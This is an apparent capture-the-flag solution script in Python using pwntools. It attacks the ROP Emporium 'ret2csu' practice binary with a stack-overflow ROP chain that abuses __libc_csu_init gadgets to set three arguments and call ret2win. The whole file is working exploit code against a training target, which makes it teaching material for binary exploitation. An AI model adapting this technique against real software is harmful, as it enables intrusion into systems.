#!/usr/bin/env python3
from pwn import *

elf = ELF("./ret2csu")
lib = ELF("./libret2csu.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

pop_rdi =  0x004006a3   # pop rdi; ret
pop6 =  0x0040069a      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
call =  0x00400680      # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8] ...
dynamic = 0x600e48      # segment.dynamic pointer to _fini

payload = b"A" * 40
payload += p64(pop6) 
payload += p64(0)                                                       # rbx
payload += p64(1)                                                       # rbp
payload += p64(dynamic)                                                 # r12
payload += p64(0) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)   # r13, r14, r15
# call _fini
payload += p64(call)             
# trash to fill add rsp 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += b"A" * 56
# call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
payload += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(elf.plt.ret2win)
 
io = process("./ret2csu")
io.send(payload)
io.interactive()
